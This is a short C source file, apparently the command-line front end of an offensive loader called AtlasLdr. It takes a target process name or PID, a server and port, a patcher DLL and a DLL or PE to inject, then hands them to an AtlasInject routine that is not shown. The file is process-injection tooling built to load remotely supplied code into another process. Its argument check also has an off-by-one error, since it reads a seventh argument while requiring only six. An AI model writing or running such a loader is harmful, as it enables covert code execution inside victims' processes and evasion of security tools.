#include <AtlasLdr.h>

int main(int argc, char* argv[]){

    if(argc < 6){
        printf("%s - Usage: %s [Process Name / PID] [Cleanup] [Server] [Port] [AtlasPatcher DLL] [DLL/PE to inject] <Entrypoint>\n",info, argv[0]);
        exit(EXIT_FAILURE);
    }
    
    ATLAS_PARAMS atlas_params;

    if(isalpha(argv[1][0])){
        atlas_params.process_name = argv[1];
        atlas_params.process_pid = NULL;
    }
    else{
        atlas_params.process_name = NULL;
        atlas_params.process_pid = atoi(argv[1]);
    }

    atlas_params.cleanupOnFinish = (atoi(argv[2]) != 0);
    atlas_params.server = argv[3];
    atlas_params.port = argv[4];
    atlas_params.atlasPatcher = argv[5];
    atlas_params.atlasPatcher_entrypoint = "AtlasPatcher";
    atlas_params.dll = argv[6];
    atlas_params.dll_entryPoint = NULL;

    if(argc == 8){
        atlas_params.dll_entryPoint = argv[7];
    }
    
    AtlasInject(atlas_params);
}